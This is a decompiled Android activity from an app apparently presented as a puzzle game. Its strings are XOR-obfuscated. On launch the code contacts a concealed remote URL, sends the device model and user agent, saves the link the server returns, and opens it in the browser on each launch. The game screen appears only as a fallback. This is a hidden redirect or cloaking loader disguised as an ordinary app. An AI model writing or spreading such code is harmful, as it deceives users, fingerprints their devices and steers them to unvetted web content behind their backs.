package com.neonpulse.gridlogic;

import H.e;
import K.x0;
import K.z0;
import O0.i;
import T.u;
import V0.d;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.view.View;
import android.view.ViewGroup;
import android.view.Window;
import android.view.WindowInsetsController;
import android.webkit.WebSettings;
import androidx.constraintlayout.widget.ConstraintLayout;
import com.neonpulse.gridlogic.MainActivity;
import com.neonpulse.gridlogic.MainActivity2;
import com.neonpulse.gridlogic.R;
import d1.InterfaceC0081a;
import g.AbstractActivityC0132i;
import java.util.ArrayDeque;
import java.util.ArrayList;
import java.util.Iterator;
import l1.a;
import l1.l;
import p1.m;
import p1.q;
import t1.g;
import t1.j;
import x1.n;

/* loaded from: classes.dex */
public final class MainActivity extends AbstractActivityC0132i {
    public static final /* synthetic */ int F = 0;

    /* renamed from: C, reason: collision with root package name */
    public final d f1981C;

    /* renamed from: E, reason: collision with root package name */
    public final d f1983E;

    /* renamed from: y, reason: collision with root package name */
    public final d f1984y;

    /* renamed from: z, reason: collision with root package name */
    public String f1985z;

    /* renamed from: A, reason: collision with root package name */
    public final String f1979A = t(new byte[]{120, 20, 120});

    /* renamed from: B, reason: collision with root package name */
    public final String f1980B = t(new byte[]{105, 7, 109, 62});

    /* renamed from: D, reason: collision with root package name */
    public final d f1982D = new d(new i(0));

    public MainActivity() {
        final int i = 0;
        this.f1984y = new d(new InterfaceC0081a(this) { // from class: O0.h

            /* renamed from: b, reason: collision with root package name */
            public final /* synthetic */ MainActivity f683b;

            {
                this.f683b = this;
            }

            @Override // d1.InterfaceC0081a
            public final Object a() {
                MainActivity mainActivity = this.f683b;
                switch (i) {
                    case 0:
                        int i2 = MainActivity.F;
                        View inflate = mainActivity.getLayoutInflater().inflate(R.layout.activity_main, (ViewGroup) null, false);
                        if (inflate != null) {
                            return new R0.d((ConstraintLayout) inflate);
                        }
                        throw new NullPointerException("rootView");
                    case 1:
                        return mainActivity.getSharedPreferences(mainActivity.f1979A, 0);
                    default:
                        int i3 = MainActivity.F;
                        return new Intent(mainActivity, (Class<?>) MainActivity2.class);
                }
            }
        });
        final int i2 = 1;
        this.f1981C = new d(new InterfaceC0081a(this) { // from class: O0.h

            /* renamed from: b, reason: collision with root package name */
            public final /* synthetic */ MainActivity f683b;

            {
                this.f683b = this;
            }

            @Override // d1.InterfaceC0081a
            public final Object a() {
                MainActivity mainActivity = this.f683b;
                switch (i2) {
                    case 0:
                        int i22 = MainActivity.F;
                        View inflate = mainActivity.getLayoutInflater().inflate(R.layout.activity_main, (ViewGroup) null, false);
                        if (inflate != null) {
                            return new R0.d((ConstraintLayout) inflate);
                        }
                        throw new NullPointerException("rootView");
                    case 1:
                        return mainActivity.getSharedPreferences(mainActivity.f1979A, 0);
                    default:
                        int i3 = MainActivity.F;
                        return new Intent(mainActivity, (Class<?>) MainActivity2.class);
                }
            }
        });
        final int i3 = 2;
        this.f1983E = new d(new InterfaceC0081a(this) { // from class: O0.h

            /* renamed from: b, reason: collision with root package name */
            public final /* synthetic */ MainActivity f683b;

            {
                this.f683b = this;
            }

            @Override // d1.InterfaceC0081a
            public final Object a() {
                MainActivity mainActivity = this.f683b;
                switch (i3) {
                    case 0:
                        int i22 = MainActivity.F;
                        View inflate = mainActivity.getLayoutInflater().inflate(R.layout.activity_main, (ViewGroup) null, false);
                        if (inflate != null) {
                            return new R0.d((ConstraintLayout) inflate);
                        }
                        throw new NullPointerException("rootView");
                    case 1:
                        return mainActivity.getSharedPreferences(mainActivity.f1979A, 0);
                    default:
                        int i32 = MainActivity.F;
                        return new Intent(mainActivity, (Class<?>) MainActivity2.class);
                }
            }
        });
    }

    public static String t(byte[] bArr) {
        ArrayList arrayList = new ArrayList(bArr.length);
        int length = bArr.length;
        int i = 0;
        int i2 = 0;
        int i3 = 0;
        while (i2 < length) {
            int i4 = i3 + 1;
            int i5 = i3 % 4;
            arrayList.add(Byte.valueOf((byte) ((i5 != 0 ? i5 != 1 ? i5 != 2 ? 82 : 31 : 114 : 27) ^ (bArr[i2] & 255))));
            i2++;
            i3 = i4;
        }
        byte[] bArr2 = new byte[arrayList.size()];
        Iterator it = arrayList.iterator();
        while (it.hasNext()) {
            bArr2[i] = ((Number) it.next()).byteValue();
            i++;
        }
        return new String(bArr2, a.f3159a);
    }

    @Override // g.AbstractActivityC0132i, a.l, android.app.Activity
    public final void onCreate(Bundle bundle) {
        g gVar;
        super.onCreate(bundle);
        u();
        setContentView(((R0.d) this.f1984y.a()).f743a);
        g gVar2 = null;
        String string = ((SharedPreferences) this.f1981C.a()).getString(this.f1980B, null);
        if (string != null && !l1.d.C(string)) {
            this.f1985z = string;
            w(string);
            return;
        }
        String packageName = getPackageName();
        String t2 = t(new byte[]{105, 7, 109, 62});
        String t3 = t(new byte[]{36, 19, 111, 34, 38});
        String str = t(new byte[]{115, 6, 107, 34, 104, 72, 48, 125, 98, 23, 115, 62, 116, 5, 50, 38, 105, 7, 107, 58, 54, 67, 45, 98, 43, 92, 120, 36, 119, 4, 105, 49, 112, 25, 112, Byte.MAX_VALUE, 114, 0, 109, 43, 117, 17, 116, 57, 122, 75, 44, 124, 108, 29, 109, 57, 126, 0, 108, 124, Byte.MAX_VALUE, 23, 105, 125}) + t3 + packageName;
        u uVar = new u(6);
        e1.d.e(str, "url");
        if (l.u(str, "ws:", true)) {
            String substring = str.substring(3);
            e1.d.d(substring, "this as java.lang.String).substring(startIndex)");
            str = "http:".concat(substring);
        } else if (l.u(str, "wss:", true)) {
            String substring2 = str.substring(4);
            e1.d.d(substring2, "this as java.lang.String).substring(startIndex)");
            str = "https:".concat(substring2);
        }
        e1.d.e(str, "<this>");
        p1.l lVar = new p1.l();
        lVar.c(null, str);
        uVar.f828a = lVar.a();
        String t4 = t(new byte[]{67, 95, 91, 55, 109, 27, 124, 55, 54, 63, 112, 54, 126, 30});
        String str2 = Build.MODEL;
        e1.d.d(str2, "MODEL");
        uVar.k(t4, str2);
        uVar.k(t(new byte[]{90, 17, 124, 55, 107, 6, 50, 30, 122, 28, 120, 39, 122, 21, 122}), t(new byte[]{126, 28, 50, 7, 72, 94, 122, 60, 32, 3, 34, 98, 53, 75}));
        String t5 = t(new byte[]{78, 1, 122, 32, 54, 51, 120, 55, 117, 6});
        String defaultUserAgent = WebSettings.getDefaultUserAgent(this);
        e1.d.d(defaultUserAgent, "getDefaultUserAgent(...)");
        uVar.k(t5, defaultUserAgent);
        e b2 = uVar.b();
        q qVar = (q) this.f1982D.a();
        qVar.getClass();
        j jVar = new j(qVar, b2);
        B.j jVar2 = new B.j(this, t2, 4);
        if (!jVar.f3762e.compareAndSet(false, true)) {
            throw new IllegalStateException("Already Executed");
        }
        n nVar = n.f4286a;
        jVar.f3763f = n.f4286a.g();
        u uVar2 = qVar.f3391a;
        g gVar3 = new g(jVar, jVar2);
        uVar2.getClass();
        synchronized (uVar2) {
            ((ArrayDeque) uVar2.f829b).add(gVar3);
            String str3 = ((m) b2.f259c).d;
            Iterator it = ((ArrayDeque) uVar2.f830c).iterator();
            while (true) {
                if (it.hasNext()) {
                    gVar = (g) it.next();
                    if (e1.d.a(((m) gVar.f3756c.f3760b.f259c).d, str3)) {
                        break;
                    }
                } else {
                    Iterator it2 = ((ArrayDeque) uVar2.f829b).iterator();
                    while (it2.hasNext()) {
                        gVar = (g) it2.next();
                        if (e1.d.a(((m) gVar.f3756c.f3760b.f259c).d, str3)) {
                        }
                    }
                }
            }
            gVar2 = gVar;
            if (gVar2 != null) {
                gVar3.f3755b = gVar2.f3755b;
            }
        }
        uVar2.r();
    }

    @Override // g.AbstractActivityC0132i, android.app.Activity
    public final void onResume() {
        super.onResume();
        String str = this.f1985z;
        if (str != null) {
            w(str);
        }
    }

    @Override // android.app.Activity, android.view.Window.Callback
    public final void onWindowFocusChanged(boolean z2) {
        super.onWindowFocusChanged(z2);
        if (z2) {
            u();
        }
    }

    /* JADX WARN: Multi-variable type inference failed */
    public final void u() {
        x0 x0Var;
        WindowInsetsController insetsController;
        x1.d.g0(getWindow(), false);
        Window window = getWindow();
        C.g gVar = new C.g(getWindow().getDecorView());
        if (Build.VERSION.SDK_INT >= 30) {
            insetsController = window.getInsetsController();
            z0 z0Var = new z0(insetsController, gVar);
            z0Var.f518f = window;
            x0Var = z0Var;
        } else {
            x0Var = new x0(window, gVar);
        }
        x0Var.H();
        x0Var.l0();
    }

    public final void v() {
        startActivity((Intent) this.f1983E.a());
    }

    public final void w(String str) {
        try {
            Intent intent = new Intent("android.intent.action.VIEW", Uri.parse(str));
            intent.addFlags(268435456);
            startActivity(intent);
        } catch (Exception unused) {
            v();
        }
    }
}
